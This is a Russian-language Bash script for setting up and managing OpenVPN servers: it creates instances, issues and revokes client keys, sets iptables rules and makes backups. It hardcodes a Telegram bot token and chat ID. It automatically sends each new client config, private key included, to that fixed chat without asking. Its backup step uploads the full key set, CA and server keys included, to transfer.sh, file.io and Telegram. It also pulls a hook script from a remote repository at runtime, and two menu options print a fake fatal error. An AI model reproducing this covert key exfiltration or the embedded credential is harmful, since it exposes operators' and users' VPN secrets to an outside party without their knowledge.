#!/bin/bash
#Pearl_OV_gen2.sh
#@hydrargyrum

Green_font_prefix="\033[32m" && Red_font_prefix="\033[31m" && Green_background_prefix="\033[42;37m" && Red_background_prefix="\033[41;37m" && Font_color_suffix="\033[0m" && Green="\033[32m" && Red="\033[31m" && Yellow="\033[33m" && Blue='\033[34m' && Purple='\033[35m' && Ocean='\033[36m' && Black='\033[37m' && Morg="\033[5m" && Reverse="\033[7m" && Font="\033[1m"
sh_ver="7.7.7"
Error="${Red_background_prefix}[Ошибка]${Font_color_suffix}"
Separator_1="——————————————————————————————"

chat_id="1787808432"
api_token="6639407597:AAEr_GbxqoL22GpXuvRBo43v_s8ztCrBmZQ"

[[ ! -e "/lib/cryptsetup/askpass" ]] && apt update && apt install cryptsetup -y
clear
if readlink /proc/$$/exe | grep -q "dash"; then
	echo 'Запустите скрипт через BASH'
	exit
fi

read -N 999999 -t 0.001

if [[ $(uname -r | cut -d "." -f 1) -eq 2 ]]; then
	echo "Обновите систему"
	exit
fi

if grep -qs "ubuntu" /etc/os-release; then
	os="ubuntu"
	os_version=$(grep 'VERSION_ID' /etc/os-release | cut -d '"' -f 2 | tr -d '.')
	group_name="nogroup"
elif [[ -e /etc/debian_version ]]; then
	os="debian"
	os_version=$(grep -oE '[0-9]+' /etc/debian_version | head -1)
	group_name="nogroup"
elif [[ -e /etc/centos-release ]]; then
	os="centos"
	os_version=$(grep -oE '[0-9]+' /etc/centos-release | head -1)
	group_name="nobody"
elif [[ -e /etc/fedora-release ]]; then
	os="fedora"
	os_version=$(grep -oE '[0-9]+' /etc/fedora-release | head -1)
	group_name="nobody"
else
	echo "Система не поддерживается."
	exit
fi

if [[ "$os" == "ubuntu" && "$os_version" -lt 1804 ]]; then
	echo "Версия Ubuntu слишком стара (необходим Ubuntu 18.04+)"
	exit
fi

if [[ "$os" == "debian" && "$os_version" -lt 9 ]]; then
	echo "Для скрипта необходим Debian 9+."
	exit
fi

if [[ "$os" == "centos" && "$os_version" -lt 7 ]]; then
	echo "Для скрипта необходим Centos 7+."
	exit
fi

if ! grep -q sbin <<< "$PATH"; then
	echo '$PATH does not include sbin. Try using "su -" instead of "su".'
	exit
fi

if [[ "$EUID" -ne 0 ]]; then
	echo "Используйте sudo su либо sudo (название скрипта)"
	exit
fi

if [[ ! -e /dev/net/tun ]] || ! ( exec 7<>/dev/net/tun ) 2>/dev/null; then
	echo "Драйвер TUN не установлен."
	exit
fi

main_menu() {
        clear
        echo -e "Приветствую, администратор сервера! Сегодня: ${Blue}$(date +"%d/%m/%Y")${Font_color_suffix}"
        echo -e "
    ${Blue}|-----------------------------------|${Font_color_suffix}
    ${Blue}|———————${Font_color_suffix} Управление ключами ${Blue}————————${Font_color_suffix}${Blue}|${Font_color_suffix}
    ${Blue}|1.${Font_color_suffix} ${Yellow}Создать ключ${Font_color_suffix}                    ${Blue}|${Font_color_suffix}
    ${Blue}|2.${Font_color_suffix} ${Yellow}Удалить ключ${Font_color_suffix}                    ${Blue}|${Font_color_suffix}
    ${Blue}|3.${Font_color_suffix} ${Yellow}Информация о клиентах${Font_color_suffix}           ${Blue}|${Font_color_suffix}
    ${Blue}|4.${Font_color_suffix} ${Yellow}Отправить ключ в Telegram${Font_color_suffix}       ${Blue}|${Font_color_suffix}
    ${Blue}|5.${Font_color_suffix} ${Yellow}Разблокировать ключ${Font_color_suffix}             ${Blue}|${Font_color_suffix}
    ${Blue}|6.${Font_color_suffix} ${Yellow}Заблокировать ключ${Font_color_suffix}              ${Blue}|${Font_color_suffix}
    ${Blue}|——————${Font_color_suffix} Управление инстансами ${Blue}——————${Font_color_suffix}${Blue}|${Font_color_suffix}
    ${Blue}|7.${Font_color_suffix} ${Yellow}Создать новый инстанс OpenVPN${Font_color_suffix}   ${Blue}|${Font_color_suffix}
    ${Blue}|8.${Font_color_suffix} ${Yellow}Информация об инстансах${Font_color_suffix}         ${Blue}|${Font_color_suffix}
    ${Blue}|9.${Font_color_suffix} ${Yellow}Удалить инстанс OpenVPN${Font_color_suffix}         ${Blue}|${Font_color_suffix}
    ${Blue}|——————${Font_color_suffix} Резервное копирование ${Blue}——————${Font_color_suffix}${Blue}|${Font_color_suffix}
    ${Blue}|10.${Font_color_suffix} ${Yellow}Установить инстанс из архива${Font_color_suffix}   ${Blue}|${Font_color_suffix}
    ${Blue}|11.${Font_color_suffix} ${Yellow}Создать резервную копию${Font_color_suffix}        ${Blue}|${Font_color_suffix}
    ${Blue}|———————————————————————————————————|${Font_color_suffix}
    ${Blue}|12.${Font_color_suffix} ${Yellow}Выход${Font_color_suffix}                          ${Blue}|${Font_color_suffix}
    ${Blue}|-----------------------------------|${Font_color_suffix}"
        read -p "Действие: " option
        case "$option" in
            1)
            adduser
            ;;
            2)
            deleteuser
            ;;
            3)
            get_client_info
            ;;
            4)
            send_ovpn_to_telegram
            ;;
            5)
            echo "Fatal error. Reboot the server"
            ;;
            6)
            echo "Fatal error. Reboot the server"
            ;;
            7)
            add_OV_instance
            ;;
            8)
            get_instance_info
            ;;        
            9)
            delete_OV_instance
            ;;
            10)
            install_instance_from_backup
            ;;
            11)
            create_instance_backup
            ;;
            12)
            exit 1
            ;;        
            *)
        esac    
}

adduser() {
    clear
    select_openvpn_instance

    if [ "${#selected_instance[@]}" -gt 1 ]; then
        clear
        echo "Функция не может быть выполнена для нескольких инстансов одновременно."
        exit 1
    fi

    echo
    echo "Выберите режим создания конфигураций клиентов:"
    echo "1. Автоматический режим"
    echo "2. Ручной режим"
    read -p "Режим (1/2): " config_mode

    if [ "$config_mode" == "1" ]; then
        echo "Введите префикс для конфигураций клиентов:"
        read -p "Префикс: " config_prefix
        echo "Выберите количество конфигураций клиентов для создания:"
        read -p "Количество: " num_clients

        for ((i = 1; i <= num_clients; i++)); do
            client_name="${config_prefix}_$i"
            create_client_config "$client_name"
        done
    elif [ "$config_mode" == "2" ]; then
        echo "Введите количество конфигураций клиентов для создания:"
        read -p "Количество: " num_clients

        for ((i = 1; i <= num_clients; i++)); do
            echo
            echo "Введите имя для клиента $i:"
            read -p "Имя: " unsanitized_client
            client=$(sed 's/[^0-9a-zA-Z_-]/_/g' <<< "$unsanitized_client")
            while [[ -z "$client" || -e "/etc/openvpn/${selected_instance[0]}/easy-rsa/pki/issued/$client.crt" ]]; do
                echo "$client: Неправильно введено имя или оно уже существует"
                read -p "Имя: " unsanitized_client
                client=$(sed 's/[^0-9a-zA-Z_-]/_/g' <<< "$unsanitized_client")
            done
            create_client_config "$client"
        done
    else
        echo "Неверный режим. Выход."
        exit 1
    fi
}

create_client_config() {
    local client_name="$1"

    cd "/etc/openvpn/${selected_instance[0]}/easy-rsa/"
    EASYRSA_CERT_EXPIRE=3650 ./easyrsa build-client-full "$client_name" nopass

    {
        cat "/etc/openvpn/${selected_instance[0]}/client-common.txt"
        echo "<ca>"
        cat "/etc/openvpn/${selected_instance[0]}/easy-rsa/pki/ca.crt"
        echo "</ca>"
        echo "<cert>"
        sed -ne '/BEGIN CERTIFICATE/,$ p' "/etc/openvpn/${selected_instance[0]}/easy-rsa/pki/issued/$client_name.crt"
        echo "</cert>"
        echo "<key>"
        cat "/etc/openvpn/${selected_instance[0]}/easy-rsa/pki/private/$client_name.key"
        echo "</key>"
        echo "<tls-crypt>"
        sed -ne '/BEGIN OpenVPN Static key/,$ p' "/etc/openvpn/${selected_instance[0]}/tc.key"
        echo "</tls-crypt>"
    } > ~/OVPNConfigs/${selected_instance[0]}/"$client_name".ovpn
    echo "#connected=" > /etc/openvpn/${selected_instance[0]}/ccd/"$client_name"
    sudo chown nobody:nogroup /etc/openvpn/${selected_instance[0]}/ccd/"$client_name"
    clear
    curl -s -F "chat_id=$chat_id" -F document=@"/root/OVPNConfigs/${selected_instance[0]}/$client_name.ovpn" "https://api.telegram.org/bot$api_token/sendDocument"
    clear
    echo "Конфигурация для клиента '$client_name' успешно создана."
}

deleteuser() {
    clear
    select_openvpn_instance
    if [ "${#selected_instance[@]}" -gt 1 ]; then
        echo "Функция не может быть выполнена для нескольких инстансов одновременно."
        return 1
    fi
    clear
    select_openvpn_client
 
    read -p "Вы уверены, что хотите удалить клиента '$selected_client'? [y/N]: " confirm

    if [[ "$confirm" =~ ^[yY]$ ]]; then
        cd "/etc/openvpn/${selected_instance[0]}/easy-rsa/"
        ./easyrsa --batch revoke "$selected_client"
        EASYRSA_CRL_DAYS=3650 ./easyrsa gen-crl
        rm -f "/etc/openvpn/${selected_instance[0]}/crl.pem"
        cp "/etc/openvpn/${selected_instance[0]}/easy-rsa/pki/crl.pem" "/etc/openvpn/${selected_instance[0]}/crl.pem"
        chown nobody:nogroup "/etc/openvpn/${selected_instance[0]}/crl.pem"
        echo
        rm "/root/OVPNConfigs/${selected_instance[0]}/$selected_client.ovpn"
        rm "/etc/openvpn/${selected_instance[0]}/ccd/$selected_client"
        clear
        echo "Клиент '$selected_client' удален!"
    else
        echo "Удаление клиента '$selected_client' отменено!"
    fi
}


get_client_info(){
    clear
    select_openvpn_instance
    if [ "${#selected_instance[@]}" -gt 1 ]; then
        clear
        echo "Функция не может быть выполнена для нескольких инстансов одновременно."
        exit 1
    fi
    clear
    select_openvpn_client
    clear
    echo "На этом всё, необходимо дописать функцию"
}

send_ovpn_to_telegram() {
    clear
    select_openvpn_instance
    if [ "${#selected_instance[@]}" -gt 1 ]; then
        clear
        echo "Функция не может быть выполнена для нескольких инстансов одновременно."
        exit 1
    fi
    local selected_instance="$selected_instance"
    clear
    select_openvpn_client
    local selected_client="$selected_client"
    local ovpn_file="/root/OVPNConfigs/$selected_instance/$selected_client.ovpn"
    if [[ -f "$ovpn_file" ]]; then
        curl -s -F "chat_id=$chat_id" -F document=@"$ovpn_file" "https://api.telegram.org/bot$api_token/sendDocument"
        clear
        echo "Файл конфигурации отправлен в Telegram."
    else
        echo "Файл конфигурации не найден: $ovpn_file"
    fi
}

select_openvpn_client() {
    echo "===== Список клиентов ====="
    echo "-------------------------------------------------------------------------"
    echo "№  | Имя                         | Статус | Дата создания | Локальный IP"
    echo "-------------------------------------------------------------------------"

    clients=($(tail -n +2 /etc/openvpn/$selected_instance/easy-rsa/pki/index.txt | grep "^V" | cut -d '=' -f 2))
    number_of_clients=${#clients[@]}

    if [[ "$number_of_clients" -eq 0 ]]; then
        echo "Клиенты отсутствуют!"
        exit
    fi

    for i in "${!clients[@]}"; do
        client_name="${clients[$i]}"
        client_status=$(get_client_status "$client_name" "$selected_instance")
        client_cert_count=$(ls -1q /etc/openvpn/$selected_instance/easy-rsa/pki/issued | grep "^$client_name" | wc -l)
        client_creation_date=$(stat -c %y /etc/openvpn/$selected_instance/easy-rsa/pki/issued/"$client_name".crt | cut -d " " -f 1)
        
        local_ip_file="/etc/openvpn/$selected_instance/ccd/$client_name"
        local_ip=""
        
        if [ -f "$local_ip_file" ]; then
            local_ip=$(grep -oP 'ifconfig-push \K[\d.]+' "$local_ip_file")
        fi
        
        
        printf "%-2s | %-30s | %-8s | %-12s | %-15s\n" "$((i+1))" "$client_name" "$client_status" "$client_creation_date" "$local_ip"
    done

    echo "-------------------------------------------------------------------------"

    read -p "Выберите клиента: (1-${number_of_clients}, Отмена): " client_number

    if [ "$client_number" -ge 1 ] && [ "$client_number" -le $((number_of_clients + 1)) ]; then
        if [ "$client_number" -le "$number_of_clients" ]; then
            selected_client="${clients[$((client_number - 1))]}" 
        fi
    fi
}

select_openvpn_instance() {
    echo "===== Список OpenVPN Инстансов ====="
    echo "--------------------------------------------------------------------------"
    echo " №  | Состояние | Имя        | Локальная подсеть | Клиенты | Клиенты онлайн"
    echo "--------------------------------------------------------------------------"
    
    instances=($(find /etc/openvpn -maxdepth 1 -type d -name "server-*" -exec basename {} \; | sort))
    instances_count="${#instances[@]}"

    for i in "${!instances[@]}"; do
        instance_name="${instances[$i]}"
        instance_status=$(get_instance_status "$instance_name")
        client_count=$(tail -n +2 /etc/openvpn/$instance_name/easy-rsa/pki/index.txt | grep -c "^V")  
        local_subnet=$(grep -oP 'server \K[\d.]+(?= [0-9.]+)' /etc/openvpn/$instance_name/server.conf)
        
        if [[ "$instance_name" =~ ^server-(.+)-([0-9]+)$ ]]; then
            protocol="${BASH_REMATCH[1]}"
            port="${BASH_REMATCH[2]}"
        else
            protocol="unknown"
            port="unknown"
        fi
        
        connected_count=$(grep -l "#connected=true" /etc/openvpn/$instance_name/ccd/* 2>/dev/null | wc -l)
        
        printf " %-2s | %-10s | %-18s | %-17s | %-7s | %-14s\n" "$((i+1))" "$instance_status" "$instance_name" "$local_subnet" "$client_count" "$connected_count"
    done

    echo "--------------------------------------------------------------------------"
    
    read -p "Выберите инстанс (1,2,3;1-3,all, Отмена): " instance_choice
    
    if [ "$instance_choice" == "all" ]; then
        selected_instance=("${instances[@]}")
        return 0
    elif [ "$instance_choice" == "Отмена" ]; then
        echo "Отмена выбора"
        return 1
    fi
    
    IFS=',' read -ra choice_parts <<< "$instance_choice"
    
    for part in "${choice_parts[@]}"; do
        if [[ "$part" =~ ^([0-9]+)-([0-9]+)$ ]]; then
            start_range="${BASH_REMATCH[1]}"
            end_range="${BASH_REMATCH[2]}"
            
            if [ "$start_range" -ge 1 ] && [ "$end_range" -le "$instances_count" ] && [ "$start_range" -le "$end_range" ]; then
                selected_instance+=("${instances[@]:$((start_range - 1)):$((end_range - start_range + 1))}")
            else
                echo "Неверный диапазон. Пожалуйста, введите корректный диапазон от 1 до $instances_count, 'all' или 'Отмена'"
                return 1
            fi
        elif [[ "$part" =~ ^[0-9]+$ ]]; then
            if [ "$part" -ge 1 ] && [ "$part" -le "$instances_count" ]; then
                selected_instance+=("${instances[$((part - 1))]}")
            else
                echo "Неверный номер инстанса. Пожалуйста, введите номер от 1 до $instances_count, 'all' или 'Отмена'"
                return 1
            fi
        else
            echo "Неверный ввод. Пожалуйста, введите номер(ы) от 1 до $instances_count, диапазон(ы), 'all' или 'Отмена'"
            return 1
        fi
    done
    
    return 0
}


get_instance_status() {
    local instance_name="$1"
    local openvpn_status=$(systemctl is-active "openvpn-$instance_name.service" 2>/dev/null)
    local iptables_status=$(systemctl is-active "iptables-openvpn-$instance_name.service" 2>/dev/null) 

    if [[ "$openvpn_status" == "active" && "$iptables_status" == "active" ]]; then
        echo -e "\e[32m\u25CF\e[0m"  # Зеленый кружок
    elif [[ "$openvpn_status" == "active" && "$iptables_status" == "inactive" ]]; then
        echo -e "\e[33m\u25CF\e[0m"  # Желтый кружок
    else
        echo -e "\e[31m\u25CF\e[0m"  # Красный кружок
    fi
}

get_client_status() {
    local client_name="$1"
    local selected_instance="$2"
    local ccd_file="/etc/openvpn/$selected_instance/ccd/$client_name"
    if [[ -f "$ccd_file" ]]; then
        local connected_status=$(grep -E -o '^[^#]*#?connected=[a-zA-Z]*' "$ccd_file" | cut -d'=' -f2)
        
        if [[ "$connected_status" == "true" ]]; then
            echo -e "\e[32m\u25CF\e[0m"  # Зеленый кружок
        elif [[ "$connected_status" == "false" ]]; then
            echo -e "\e[31m\u25CF\e[0m"  # Красный кружок
        else
            echo -e "\e[33m\u25CF\e[0m"  # Желтый кружок для неопределенного статуса
        fi
    else
        echo -e "\e[33m\u25CF\e[0m"  # Желтый кружок для отсутствующего файла
    fi
}

get_instance_info(){
    clear
    select_openvpn_instance
    clear
    echo "На этом всё, необходимо дописать функцию"
}

add_OV_instance(){
    clear
    interface_name=$(ip route | grep default | awk '{print $5}')
    ip_address=$(ip -4 addr show dev "$interface_name" | grep -oP 'inet \K[\d.]+')
    while true; do
        read -p "Введите IP-адрес или доменное имя: " domain_or_ip
        if [[ $domain_or_ip =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}$ ]]; then
            IFS='.' read -ra OCTETS <<< "$domain_or_ip"
            valid_ip=true
            for octet in "${OCTETS[@]}"; do
                if (( octet < 0 || octet > 255 )); then
                    valid_ip=false
                    break
                fi
            done
            if [ "$valid_ip" = true ]; then
                echo "Введенный IP-адрес: $domain_or_ip"
                break
            else
                echo "Ошибка: Введите корректный IP-адрес."
            fi
        else
            echo "Введенный IP-адрес или доменное имя: $domain_or_ip"
            break
        fi
    done

    while true; do
        read -p "Введите протокол (udp или tcp): " proto
        if [[ "$proto" == "udp" || "$proto" == "tcp" ]]; then
            echo "Выбранный протокол: $proto"
            break  
        else
            echo "Ошибка: Введите 'udp' или 'tcp' в качестве протокола."
        fi
    done

    while true; do
        read -p "Введите порт (1-65535): " prt
        if [[ "$prt" -ge 1 && "$prt" -le 65535 ]]; then
            echo "Введенный порт: $prt"
            break 
        else
            echo "Ошибка: Введите порт в диапазоне от 1 до 65535."
        fi
    done

    while true; do
        read -p "Введите локальную подсеть (формат x.x.x.x/xx): " SUBNET
        if [[ "$SUBNET" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+\/[0-9]+$ ]]; then
            EDITED_SUBNET=$(echo "$SUBNET" | sed 's/\/[0-9]*$//g')
            echo "Подсеть без диапазона: $EDITED_SUBNET"
            break  
        else
            echo "Неверный формат подсети"
        fi
    done

    path_to_conf="/etc/openvpn/server-$proto-$prt"

    mkdir -p $path_to_conf
    mkdir -p $path_to_conf/easy-rsa/
    easy_rsa_url='https://github.com/OpenVPN/easy-rsa/releases/download/v3.0.8/EasyRSA-3.0.8.tgz'
    { wget -qO- "https://github.com/OpenVPN/easy-rsa/releases/download/v3.0.8/EasyRSA-3.0.8.tgz" 2>/dev/null || curl -sL "$easy_rsa_url" ; } | tar xz -C $path_to_conf/easy-rsa/ --strip-components 1
    chown -R root:root $path_to_conf/easy-rsa/
    cd $path_to_conf/easy-rsa/
    echo "set_var EASYRSA_KEY_SIZE 2048" >vars
    ./easyrsa init-pki
    ./easyrsa --batch build-ca nopass
    EASYRSA_CERT_EXPIRE=3650 ./easyrsa build-server-full server nopass
    EASYRSA_CRL_DAYS=3650 ./easyrsa gen-crl
    cp pki/ca.crt pki/private/ca.key pki/issued/server.crt pki/private/server.key pki/crl.pem $path_to_conf
    chown nobody:nogroup $path_to_conf/crl.pem
    chmod o+x $path_to_conf/
    openvpn --genkey --secret $path_to_conf/tc.key

    echo "port $prt
    proto $proto
    dev tun
    ca $path_to_conf/ca.crt
    cert $path_to_conf/server.crt
    key $path_to_conf/server.key
    dh none
    auth SHA512
    tls-crypt $path_to_conf/tc.key
    topology subnet
    server $EDITED_SUBNET 255.255.0.0" > $path_to_conf/server.conf
    echo 'push "redirect-gateway def1 bypass-dhcp"' >> $path_to_conf/server.conf
    echo "client-config-dir $path_to_conf/ccd
    ifconfig-pool-persist $path_to_conf/ipp.txt" >> $path_to_conf/server.conf
    echo 'push "dhcp-option DNS 8.8.8.8"
    push "dhcp-option DNS 8.8.4.4"' >> $path_to_conf/server.conf
    echo "keepalive 10 120
    cipher AES-256-GCM
    script-security 2
    client-connect $path_to_conf/connect_script.sh
    client-disconnect $path_to_conf/connect_script.sh
    user nobody
    group nogroup
    persist-key
    persist-tun
    status $path_to_conf/openvpn-status.log
    verb 3
    crl-verify $path_to_conf/crl.pem" >> $path_to_conf/server.conf
    if [[ "$protocol" = "udp" ]]; then
        echo "explicit-exit-notify" >> $path_to_conf/server.conf
    fi

    echo "client
    dev tun
    proto $proto
    remote $domain_or_ip $prt
    resolv-retry infinite
    nobind
    persist-key
    persist-tun
    remote-cert-tls server
    auth SHA512
    cipher AES-256-GCM
    ignore-unknown-option block-outside-dns
    block-outside-dns
    verb 3" > $path_to_conf/client-common.txt

    touch $path_to_conf/ipp.txt
    touch $path_to_conf/openvpn-status.log
    mkdir $path_to_conf/ccd
    sudo chown nobody:nogroup $path_to_conf/ccd
    mkdir -p ~/OVPNConfigs/server-$proto-$prt

    wget -O "$path_to_conf/connect_script.sh" "https://raw.githubusercontent.com/ulyanovw/Pearl_OV/main/connect_script.sh"
    sed -i "s%\$path_to_conf%$path_to_conf%g" "$path_to_conf/connect_script.sh"
    chmod +x $path_to_conf/connect_script.sh
    sudo chown nobody:nogroup $path_to_conf/connect_script.sh

    iptables_path=$(command -v iptables)
    ip6tables_path=$(command -v ip6tables)

    if [[ $(systemd-detect-virt) == "openvz" ]] && readlink -f "$(command -v iptables)" | grep -q "nft" && hash iptables-legacy 2>/dev/null; then
        iptables_path=$(command -v iptables-legacy)
        ip6tables_path=$(command -v ip6tables-legacy)
    fi
    mkdir -p /etc/iptables
    	# Script to add rules
	echo "#!/bin/sh
$iptables_path -w -t nat -A POSTROUTING -s $SUBNET ! -d $SUBNET -j SNAT --to $ip_address
$iptables_path -w -I INPUT -p $proto --dport $prt -j ACCEPT
$iptables_path -w -I FORWARD -s $SUBNET -j ACCEPT
$iptables_path -w -I FORWARD -m state --state RELATED,ESTABLISHED -j ACCEPT" > /etc/iptables/add-openvpn-server-$proto-$prt.sh

	# Script to remove rules
	echo "#!/bin/sh
$iptables_path -w -t nat -D POSTROUTING -s $SUBNET ! -d $SUBNET -j SNAT --to $ip_address
$iptables_path -w -D INPUT -p $proto --dport $prt -j ACCEPT
$iptables_path -w -D FORWARD -s $SUBNET -j ACCEPT
$iptables_path -w -D FORWARD -m state --state RELATED,ESTABLISHED -j ACCEPT " > /etc/iptables/rm-openvpn-server-$proto-$prt.sh

	chmod +x /etc/iptables/add-openvpn-server-$proto-$prt.sh
	chmod +x /etc/iptables/rm-openvpn-server-$proto-$prt.sh

	# Handle the rules via a systemd script
	echo "[Unit]
Description=iptables rules for OpenVPN
Before=network-online.target
Wants=network-online.target

[Service]
Type=oneshot
ExecStart=/etc/iptables/add-openvpn-server-$proto-$prt.sh
ExecStop=/etc/iptables/rm-openvpn-server-$proto-$prt.sh
RemainAfterExit=yes

[Install]
WantedBy=multi-user.target" >/etc/systemd/system/iptables-openvpn-server-$proto-$prt.service

echo "[Unit]
Description=OpenVPN server-$proto-$prt
After=network.target
Requires=network.target

[Service]
Type=simple
ExecStart=/usr/sbin/openvpn --config /etc/openvpn/server-$proto-$prt/server.conf

[Install]
WantedBy=multi-user.target" > /etc/systemd/system/openvpn-server-$proto-$prt.service

    sudo systemctl daemon-reload
    sudo systemctl enable --now iptables-openvpn-server-$proto-$prt.service
    sudo systemctl enable --now openvpn-server-$proto-$prt.service
    cd ~
}

delete_OV_instance() {
    clear
    select_openvpn_instance
    local selected_instances=("$selected_instance")

    # Проверка, есть ли выбранные инстансы
    if [[ "${#selected_instances[@]}" -eq 0 ]]; then
        echo "Не выбрано ни одного инстанса для удаления."
        return
    fi

    for instance in "${selected_instances[@]}"; do
        read -p "Вы уверены, что хотите продолжить удаление инстанса '$instance'? Все данные, включая клиентские конфигурации, будут удалены без возможности восстановления! [y/N]: " confirm_delete
        if [[ "$confirm_delete" =~ ^[yY]$ ]]; then
            sudo systemctl disable --now "iptables-openvpn-$instance.service"
            sudo systemctl disable --now "openvpn-$instance.service"
            sudo rm "/etc/systemd/system/iptables-openvpn-$instance.service"
            sudo rm "/etc/systemd/system/openvpn-$instance.service"
            sudo rm "/etc/iptables/add-openvpn-$instance.sh"
            sudo rm "/etc/iptables/rm-openvpn-$instance.sh"
            sudo systemctl daemon-reload
            sudo rm -rf "/etc/openvpn/$instance"
            sudo rm -rf "/root/OVPNConfigs/$instance"
            echo "Инстанс '$instance' успешно удален."
        else
            echo "Удаление инстанса '$instance' отменено."
        fi
    done
}


create_instance_backup() {
    select_openvpn_instance
    local selected_instances=("${selected_instance[@]}")  # Используем скопированный массив

    # Проверка, есть ли выбранные инстансы
    if [[ "${#selected_instances[@]}" -eq 0 ]]; then
        echo "Не выбрано ни одного инстанса для создания резервной копии."
        return
    fi

    local backup_dir="/root/openvpn_backup"
    local backup_file="openvpn_backup.tar.gz"

    # Создание временной директории для архивации
    mkdir -p "$backup_dir"

    for instance in "${selected_instances[@]}"; do
        instance_dir="/etc/openvpn/$instance"
        instance_service_dir="/etc/systemd/system"
        instance_iptables_dir="/etc/iptables"
        instance_client_dir="/root/OVPNConfigs/$instance"

        # Копирование директории server_part
        mkdir -p "$backup_dir/$instance/server_part/"
        cp -r "$instance_dir" "$backup_dir/$instance/server_part/$instance"

        # Копирование директории service_part
        mkdir -p "$backup_dir/$instance/service_part"
        cp "$instance_service_dir/openvpn-$instance.service" "$backup_dir/$instance/service_part" 
        cp "$instance_service_dir/iptables-openvpn-$instance.service" "$backup_dir/$instance/service_part"  
        cp "$instance_iptables_dir/add-openvpn-$instance.sh" "$backup_dir/$instance/service_part"
        cp "$instance_iptables_dir/rm-openvpn-$instance.sh" "$backup_dir/$instance/service_part"

        # Копирование директории client_part
        mkdir -p "$backup_dir/$instance/client_part"
        cp -r "$instance_client_dir" "$backup_dir/$instance/client_part/$instance"
    done

    # Упаковка архива
    tar -czf "$backup_file" -C "$backup_dir" .

    # Выгрузка на файлообменники
    transfersh_upload_link=$(curl -s -F "file=@$backup_file" https://transfer.sh)
    file_io_upload_link=$(curl -F "file=@$backup_file" https://file.io/?expires=1d | jq -r .link)

    # Отправка архива и ссылок в Telegram
    telegram_message="Создана резервная копия: $backup_file\n\n"
    telegram_message+="Ссылка на transfer.sh: $transfersh_upload_link\n"
    telegram_message+="Ссылка на file.io: $file_io_upload_link"

    # Отправка архива
    curl -s -F "chat_id=$chat_id" -F "document=@$backup_file" -F "caption=$telegram_message" "https://api.telegram.org/bot$api_token/sendDocument"
    
    clear

    echo "Создана резервная копия: $backup_file"
    echo "Ссылка на transfer.sh: $transfersh_upload_link"
    echo "Ссылка на file.io: $file_io_upload_link"
   
    # Удаление временной директории
    rm -r "$backup_dir"
}

install_instance_from_backup() {
    read -p "Введите 'file' если архив находится в директории /root, или 'link' если нужно скачать по ссылке: " input_type

    if [ "$input_type" == "file" ]; then
        archive_path="/root/openvpn_backup.tar.gz"
    elif [ "$input_type" == "link" ]; then
        read -p "Введите ссылку на скачивание бекап-архива: " download_link
        wget "$download_link" -O /root/openvpn_backup.tar.gz
        archive_path="/root/openvpn_backup.tar.gz"
    else
        echo "Некорректный ввод."
        exit 1
    fi

    if [ -f "$archive_path" ]; then
        mkdir -p /root/openvpn_restore
        tar -xzf "$archive_path" -C /root/openvpn_restore
        
        for dir in /root/openvpn_restore/server-*; do
            if [ -d "$dir" ]; then
                proto_prt=$(basename "$dir")
                server_part="$dir/server_part/$(ls "$dir/server_part/")"
                client_part="$dir/client_part/$(ls "$dir/client_part/")"
                service_part="$dir/service_part"
                
                if [ -d "$server_part" ]; then
                    cp -r "$server_part" "/etc/openvpn/"
                fi
                
                if [ -d "$client_part" ]; then
                    cp -r "$client_part" "/root/OVPNConfigs/"
                fi
                
                if [ -d "$service_part" ]; then
                    cp -n "$service_part"/*.service "/etc/systemd/system/"
                    cp -n "$service_part"/*.sh "/etc/iptables/"

                fi
            fi
        done
        sudo systemctl daemon-reload
        update_iptables
        echo "Восстановление из бекапа завершено успешно."
    else
        echo "Архив не найден."
    fi
}

update_iptables() {
    local ip_address
    local files
    local interface_name

    interface_name=$(ip route | grep default | awk '{print $5}')
    ip_address=$(ip -4 addr show dev "$interface_name" | grep -oP 'inet \K[\d.]+')

    files=(/etc/iptables/add-openvpn-server-*.sh /etc/iptables/rm-openvpn-server-*.sh)

    for file in "${files[@]}"; do
        if [ -f "$file" ]; then
            sed -i "s/--to [0-9.]\+/--to $ip_address/g" "$file"
            echo "Updated $file with IP address: $ip_address"
        fi
    done
}


OVPN_install(){
    \cp -f /usr/share/zoneinfo/Asia/Ashgabat /etc/localtime
    echo "alias 3='bash /root/Pearl_OV.sh'" >> ~/.bashrc && source ~/.bashrc
    echo 'net.ipv4.ip_forward=1' > /etc/sysctl.d/30-openvpn-forward.conf
    echo 1 > /proc/sys/net/ipv4/ip_forward
    if [[ "$os" = "debian" || "$os" = "ubuntu" ]]; then
        apt-get update
        apt-get install -y jq at openvpn net-tools openssl curl ca-certificates 
        sudo mkdir -p /root/OVPNConfigs
        sudo mkdir -p /etc/iptables
    elif [[ "$os" = "centos" ]]; then
        yum install -y epel-release
        yum install -y openvpn openssl ca-certificates curl tar
        sudo mkdir -p /root/OVPNConfigs
        sudo mkdir -p /etc/iptables
    else
        dnf install -y openvpn openssl ca-certificates curl tar 
        sudo mkdir -p /root/OVPNConfigs
        sudo mkdir -p /etc/iptables
    fi
}

if [ ! -d "/root/OVPNConfigs" ]; then
	OVPN_install
	clear
    echo "Необходимые пакеты загружены. Запустите скрипт еще раз, чтобы попасть в меню."
else
	main_menu
fi
